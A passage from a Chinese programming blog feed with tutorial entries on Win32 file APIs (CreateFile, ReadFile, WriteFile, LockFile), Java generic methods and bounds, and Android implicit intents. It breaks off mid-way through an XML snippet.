<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WriteFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hFile,                    <span class="comment">// handle to file to write to</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCVOID lpBuffer,                <span class="comment">// pointer to data to write to file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nNumberOfBytesToWrite,     <span class="comment">// number of bytes to write</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpNumberOfBytesWritten,  <span class="comment">// pointer to number of bytes written</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPOVERLAPPED lpOverlapped        <span class="comment">// pointer to structure for overlapped I/O</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>下面说几个重点的参数就好了</p>
<ul>
<li><code>lpBuffer</code>这个参数就是接受的一个缓冲区</li>
<li><code>nNumberOfBytesToWrite</code>这个是用来读取的一个长度</li>
<li><code>lpNumberOfBytesWritten</code>实际读取的一个大小，用来判断是否结束了一般</li>
<li><code>lpOverlapped</code>重叠I/O的，NULL就好了，基本用不大到<br>说了这么多我们操作一下试试，首先还是要用到我们之前的<code>CreateFile</code>来打开我们的文件，获得文件的一个指针：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hFile;</span><br><span class="line">	hFile = CreateFile(<span class="string">"Wker.txt"</span>,</span><br><span class="line">					FILE_SHARE_READ,<span class="comment">//要读这个文件	</span></span><br><span class="line">					<span class="number">0</span>,<span class="comment">//不共享</span></span><br><span class="line">					<span class="literal">NULL</span>,<span class="comment">//默认的安全属性</span></span><br><span class="line">					OPEN_EXISTING,<span class="comment">//打开文件</span></span><br><span class="line">					FILE_ATTRIBUTE_NORMAL,<span class="comment">//普通文件 </span></span><br><span class="line">					<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"打开失败，看看是不是有杀毒软件哦！"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD realRead;</span><br><span class="line">	SetFilePointer(hFile,<span class="number">0</span>, <span class="literal">NULL</span>, FILE_BEGIN); </span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">char</span>* t = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">20</span>];</span><br><span class="line">		<span class="keyword">if</span>( !ReadFile(hFile,t,<span class="number">20</span>,&amp;realRead,<span class="literal">NULL</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"fail"</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		t[realRead] = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;t;</span><br><span class="line">	&#125;<span class="keyword">while</span>(realRead == <span class="number">20</span>);</span><br><span class="line">	 </span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>这个地方我们要注意我们的文件属性，要与你的文本属性相同！</strong><br>写文件的话呢其实也很简单：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WriteFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hFile,                    <span class="comment">// handle to file to write to</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCVOID lpBuffer,                <span class="comment">// pointer to data to write to file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nNumberOfBytesToWrite,     <span class="comment">// number of bytes to write</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpNumberOfBytesWritten,  <span class="comment">// pointer to number of bytes written</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPOVERLAPPED lpOverlapped        <span class="comment">// pointer to structure for overlapped I/O</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>参数可以看出基本上是一模一样的，那我们还是看个小例子：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hFile;</span><br><span class="line">	hFile = CreateFile(<span class="string">"Wker.txt"</span>,</span><br><span class="line">					GENERIC_WRITE,<span class="comment">//要写这个文件	</span></span><br><span class="line">					<span class="number">0</span>,<span class="comment">//不共享</span></span><br><span class="line">					<span class="literal">NULL</span>,<span class="comment">//默认的安全属性</span></span><br><span class="line">					OPEN_EXISTING,<span class="comment">//打开文件</span></span><br><span class="line">					FILE_ATTRIBUTE_NORMAL,<span class="comment">//普通文件 </span></span><br><span class="line">					<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"打开失败，看看是不是有杀毒软件哦！"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD RealWrite;</span><br><span class="line">	<span class="keyword">char</span> t[<span class="number">4</span>] = <span class="string">"aaa"</span>;</span><br><span class="line">	WriteFile(hFile,t,<span class="number">3</span>,&amp;RealWrite,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(RealWrite != <span class="number">3</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"fail:"</span>&lt;&lt;RealWrite;</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Write Success"</span>;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但在这个地方我们要注意，我们要写入的自己不需要带最后的00，他好像可以自己加上去。<br>PS：注意了！！！在用这个函数的时候，我们写完的时候，其实内容没有立马改变，而是写在了缓冲区中，Windows会找到合适的时机再写入磁盘的。<br>立即刷新的话呢，我们可以用<code>CloseHandle</code>或者使用比较有针对性的函数：<code>FlushFileBuffers</code>，参数都是一样的，最后一个是专门用来刷新缓冲区数据的。</p>
<h2 id="LockFile与UnlockFile"><a href="#LockFile与UnlockFile" class="headerlink" title="LockFile与UnlockFile"></a><code>LockFile</code>与<code>UnlockFile</code></h2><p>对于文件的安全性，防止文件在写入的过程中内容又被读取我们可以使用这两个函数，主要是对文件的缓冲区进行一定的保护作用，看一下这两个函数的一个定义：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//加锁</span></span><br><span class="line"><span class="function">BOOL <span class="title">LockFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hFile,           <span class="comment">// handle of file to lock</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFileOffsetLow,  <span class="comment">// low-order word of lock region offset</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFileOffsetHigh,  <span class="comment">// high-order word of lock region offset</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nNumberOfBytesToLockLow,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="comment">// low-order word of length to lock</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nNumberOfBytesToLockHigh </span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="comment">// high-order word of length to lock</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//解锁</span></span><br><span class="line"><span class="function">BOOL <span class="title">UnlockFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hFile,           <span class="comment">// handle of file to unlock</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFileOffsetLow,  <span class="comment">// low-order word of lock region offset</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFileOffsetHigh,  <span class="comment">// high-order word of lock region offset</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nNumberOfBytesToUnlockLow,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="comment">// low-order word of length to unlock</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nNumberOfBytesToUnlockHigh </span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="comment">// high-order word of length to unlock</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>参数基本一致那几个High的值很明显就是针对于特大文件的高32位的值，我们用NULL就可以了的，其他参数就是一个文件的加锁开始位置和加锁区域。<br>在这里需要注意的是，虽然我们的加锁文件结束进程的时候会自动解锁，但是这个还是最好显示的调用解锁函数避免我们有的时候文件无法正常的打开，而且Windows解锁文件的时间取决于当前可用的系统内存。</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows-CreateFile</title>
    <url>/2020/01/23/Windows-CreateFile/</url>
    <content><![CDATA[<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><p>这个文件操作呢其实别叫泛，调用函数的类型其实是许多的，但是最强大的那个呢还是要数<code>CreateFile</code>了。来看一下MSDN的介绍吧：<br>The CreateFile function creates or opens the following objects and returns a handle that can be used to access the object: </p>
<ul>
<li>files </li>
<li>pipes </li>
<li>mailslots </li>
<li>communications resources </li>
<li>disk devices (Windows NT only) </li>
<li>consoles </li>
<li>directories (open only) </li>
</ul>
<p>控制台，通信资源，目录（只读打开），磁盘驱动器，文件，邮槽，管道。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpFileName,          <span class="comment">// pointer to name of the file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwDesiredAccess,       <span class="comment">// access (read-write) mode</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwShareMode,           <span class="comment">// share mode</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="comment">// pointer to security attributes</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwCreationDisposition,  <span class="comment">// how to create</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFlagsAndAttributes,  <span class="comment">// file attributes</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hTemplateFile         <span class="comment">// handle to file with attributes to </span></span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="comment">// copy</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*下面中文的一个简洁*/</span></span><br><span class="line"><span class="function">HANDLE <span class="title">CreateFile</span><span class="params">(LPCTSTR lpFileName, <span class="comment">//普通文件名或者设备文件名</span></span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD dwDesiredAccess, <span class="comment">//访问模式（写/读）</span></span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD dwShareMode, <span class="comment">//共享模式</span></span></span></span><br><span class="line"><span class="function"><span class="params">	LPSECURITY_ATTRIBUTES lpSecurityAttributes, <span class="comment">//指向安全属性的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD dwCreationDisposition, <span class="comment">//如何创建</span></span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD dwFlagsAndAttributes, <span class="comment">//文件属性</span></span></span></span><br><span class="line"><span class="function"><span class="params">	HANDLE hTemplateFile <span class="comment">//用于复制文件句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>其实呢，复杂归复杂，但是有一些东西我们可能很少能用到，比如说按个安全属性，基本上用不到。</p>
<ol>
<li><code>lpFileName</code>这个参数其实就是类似于路径的一个东西，<ul>
<li>文件：文件的名称</li>
<li>串口：COM1为文件名</li>
<li>服务：\.\服务名称（.代表本地机器）</li>
<li>网络上其他主机文件：\主机名\共享目录名\文件名</li>
</ul>
</li>
<li><code>dwDesiredAccess</code>这个就是文件的打开方式<ul>
<li>标准控制权限(16-23位掩码)：</li>
<li>DELETE 删除对象的权限。</li>
<li>READ_CONTROL 从对象的安全描述符中读取信息的权限，但不包括SACL(系统访问控制列表)中的信息。</li>
<li>WRITE_DAC 修改对象安全描述符中的DACL(随机访问控制列表)的权限</li>
<li>WRITE_OWNER 修改对象安全描述符中的属主的权限</li>
<li>SYNCHRONIZE 同步化使用对象的权限，即可以创建一个线程等待信号量释放(但有些对象不支持这个权限)。</li>
<li>STANDARD_RIGHTS_REQUIRED 等价于前面四种权限的总合(通常这四种是必须具有的权限)。</li>
<li>STANDARD_RIGHTS_READ 一般等价于READ_CONTROL</li>
<li>STANDARD_RIGHTS_WRITE 一般等价于READ_CONTROL</li>
<li>STANDARD_RIGHTS_EXECUTE 一般等价于READ_CONTROL</li>
<li>STANDARD_RIGHTS_ALL 等价于前面五种权限的总合。</li>
<li>特殊控制权限(0-15位掩码)：</li>
<li>SPECIFIC_RIGHTS_ALL</li>
<li>ACCESS_SYSTEM_SECURITY</li>
<li>MAXIMUM_ALLOWED</li>
<li>GENERIC_READ</li>
<li>GENERIC_WRITE</li>
<li>GENERIC_EXECUTE</li>
<li>GENERIC_ALL</li>
<li>注：实质上是通过ACCESS_MASK结构体的一个双字值来设置标准权限、特殊权限和一般权限的。</li>
</ul>
</li>
<li><code>dwShareMode</code>这个参数就是共享的方式，百度上的解释：<ul>
<li>如果是零表示不共享； 如果是FILE_SHARE_DELETE表示随后打开操作对象会成功，但只有删除访问请求的权限；如果是FILE_SHARE_READ随后打开操作对象会成功只有请求读访问的权限；如果是FILE_SHARE_WRITE 随后打开操作对象会成功，但只有请求写访问的权限。</li>
</ul>
</li>
<li><code>lpSecurityAttributes</code>这个参数就是一个指向安全属性的一个指针，这个有点乱，我一般就填写NULL，这个就是默认。</li>
<li><code>dwCreationDisposition</code>这个参数文件的状态，主要是下面这几个常量：<ul>
<li>CREATE_NEW 创建文件；如文件存在则会出错</li>
<li>CREATE_ALWAYS 创建文件，会改写前一个文件</li>
<li>OPEN_EXISTING 文件必须已经存在。由设备提出要求</li>
<li>OPEN_ALWAYS 如文件不存在则创建它</li>
<li>TRUNCATE_EXISTING 将现有文件缩短为零长度</li>
</ul>
</li>
<li><code>dwFlagsAndAttributes</code>这个参数新建文件的属性和标志，也就是下面几个常量：<br>FILE_ATTRIBUTE_ARCHIVE 标记归档属性<br>FILE_ATTRIBUTE_COMPRESSED 将文件标记为已压缩，或者标记为文件在目录中的默认压缩方式<ul>
<li>FILE_ATTRIBUTE_NORMAL 默认属性</li>
<li>FILE_ATTRIBUTE_HIDDEN 隐藏文件或目录</li>
<li>FILE_ATTRIBUTE_READONLY 文件为只读</li>
<li>FILE_ATTRIBUTE_SYSTEM 文件为系统文件</li>
<li>FILE_FLAG_WRITE_THROUGH 操作系统不得推迟对文件的写操作</li>
<li>FILE_FLAG_OVERLAPPED 允许对文件进行重叠操作</li>
<li>FILE_FLAG_NO_BUFFERING 禁止对文件进行缓冲处理。文件只能写入磁盘卷的扇区块</li>
<li>FILE_FLAG_RANDOM_ACCESS 针对随机访问对文件缓冲进行优化</li>
<li>FILE_FLAG_SEQUENTIAL_SCAN 针对连续访问对文件缓冲进行优化</li>
<li>FILE_FLAG_DELETE_ON_CLOSE 关闭了上一次打开的句柄后，将文件删除。特别适合临时文件</li>
</ul>
</li>
<li><code>hTemplateFile</code>是个文件的模板，这个参数好像已经废掉了，写个NULL就可以了。</li>
</ol>
<p>返回值的话呢，就是一个文件的句柄，接受之后就可以对其操作了，也不只是文件句柄，很多的东西呢，之后再说。</p>
<h2 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h2><p>为了方便起见，我就拿简单的读写文件进行演示吧，其他的都是放在后面说：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hFile;</span><br><span class="line">	hFile = CreateFile(<span class="string">"Wker.txt"</span>,</span><br><span class="line">					GENERIC_WRITE,<span class="comment">//要写这个文件	</span></span><br><span class="line">					<span class="number">0</span>,<span class="comment">//不共享</span></span><br><span class="line">					<span class="literal">NULL</span>,<span class="comment">//默认的安全属性</span></span><br><span class="line">					CREATE_ALWAYS,<span class="comment">//创建文件</span></span><br><span class="line">					FILE_ATTRIBUTE_NORMAL,<span class="comment">//普通文件 </span></span><br><span class="line">					<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"打开失败，看看是不是有杀毒软件哦！"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//操作文件指针 </span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码简单易懂，看下就好了。</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>java-泛型2</title>
    <url>/2020/01/23/java-%E6%B3%9B%E5%9E%8B2/</url>
    <content><![CDATA[<h2 id="泛型方法"><a href="#泛型方法" class="headerlink" title="泛型方法"></a>泛型方法</h2><p>这个东西相对而言有点小复杂，这里的话呢简单介绍一些比较常用的方式。泛型的方法的话呢其实也就是在一个类中增加一个泛型的方法，看下面的示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String agrs[])</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">double</span> a = <span class="number">100</span>;</span><br><span class="line">		ceshi tCeshi = <span class="keyword">new</span> ceshi();</span><br><span class="line">		System.out.print(<span class="string">"值:"</span>+tCeshi.&lt;Double&gt;getString(a));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ceshi</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> &lt;T&gt; <span class="function">String <span class="title">getString</span><span class="params">(T a)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> a.toString();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出，其实那个尖括号里面的类型就是用来定义参数类型的。<br>而且这里，静态方法需要再次声明，例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String agrs[])</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">int</span> a = <span class="number">100</span>;</span><br><span class="line">		ceshi &lt;Integer&gt; tCeshi  = <span class="keyword">new</span> ceshi();</span><br><span class="line">		tCeshi.p(a);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ceshi</span> &lt;<span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> T aT;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">p</span><span class="params">(T a)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		System.out.print(a);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就像是这个样子，静态方法需要再次定义。</p>
<h2 id="泛型可变参数方法"><a href="#泛型可变参数方法" class="headerlink" title="泛型可变参数方法"></a>泛型可变参数方法</h2><p>其实大同小异啦，主要还是要说一下是哪个类型：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String agrs[])</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">int</span> a = <span class="number">100</span>;</span><br><span class="line">		ceshi &lt;Integer&gt; tCeshi  = <span class="keyword">new</span> ceshi();</span><br><span class="line">		tCeshi.p(a,<span class="number">500</span>,<span class="number">600</span>,<span class="number">900</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ceshi</span> &lt;<span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">p</span><span class="params">(T... a)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">			System.out.println(a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="泛型上下边界"><a href="#泛型上下边界" class="headerlink" title="泛型上下边界"></a>泛型上下边界</h2><p>这个东西就是一个定义，其实也不难理解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String agrs[])</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		ceshi &lt;Son&gt; tCeshi  = <span class="keyword">new</span> ceshi();</span><br><span class="line">		tCeshi.p(<span class="number">500</span>,<span class="number">600</span>,<span class="number">900</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ceshi</span> &lt;<span class="title">T</span> <span class="keyword">extends</span> <span class="title">fa</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">p</span><span class="params">(T... a)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">			System.out.println(a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">fa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实仔细看看就是对于我们传入的类型界定一下。</p>
<h2 id="泛型数组"><a href="#泛型数组" class="headerlink" title="泛型数组"></a>泛型数组</h2><p>这个东西有点乱，看了一大顿也不是十分透彻，简单的总结一下。<br>1.不能和创建一个确切的泛型类型数组<br><img src="img1.jpg" alt="错误"><br>可以看到这个样子是不行的，<br>那么我们只能这个样子，使用通配符。<br>但是在最后，取出数据是要做显式的类型转换的。<br>但是我的JDK好像和网上的代码有冲突，这里就不贴图片了。！！！</p>
<p>最近冠状病毒肆虐，希望大家都能够注意健康，也快过年了，希望大家都平平安安的！！！</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Intent Open Activity3</title>
    <url>/2020/01/23/Intent-Open-Activity3/</url>
    <content><![CDATA[<h1 id="隐示Intent"><a href="#隐示Intent" class="headerlink" title="隐示Intent"></a>隐示Intent</h1><p>这个东西是个好东西，主要是用来增加打开方式的，这个和Windows有点区别，windows打开方式的设定是写注册表项，而这个的话呢是来设置我们Activity的一个过滤器就可以达到这个效果，具体看下面操作：</p>
<h2 id="设置AndroidManifest-xml"><a href="#设置AndroidManifest-xml" class="headerlink" title="设置AndroidManifest.xml"></a>设置AndroidManifest.xml</h2><p>首先我们增加一个filter，具体看下面代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".activity"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.wker.top"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个首先定义我们的action名称，这个可以自定义，有点类似于一个索引。category的值这里我们限制为这个默认的值，设置好之后，我们加一个按钮事件，通过这个Intent-filter打开这个Activity。</p>
<h2 id="增加打开事件"><a href="#增加打开事件" class="headerlink" title="增加打开事件"></a>增加打开事件</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">intent.setAction(<span class="string">"com.wker.top"</span>);</span><br><span class="line">intent.addCategory(Intent.CATEGORY_DEFAULT);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
<p>还是先new一个intent，然后设置一下Action的值，然后增加一个category（这里可以看到我们的category是add上去的，所以应该是可以添加多个），然后启动这个intent，这里的效果和我们普通的意图（intent）是一样的，那么我们用这个有什么好处呢？下面我们增加一个新的工程，然后在他的AndroidManifest.xml。</p>
<h2 id="打开方式"><a href="#打开方式" class="headerlink" title="打开方式"></a>打开方式</h2><p>我们将我们上面的intent-filter设置的内容复制到那个activity项目中，例如下面：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">           <span class="attr">android:name</span>=<span class="string">".MainActivity"</span></span></span><br><span class="line"><span class="tag">           </span></span><br><span class="line"><span class="tag">           <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span> &gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">               <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span 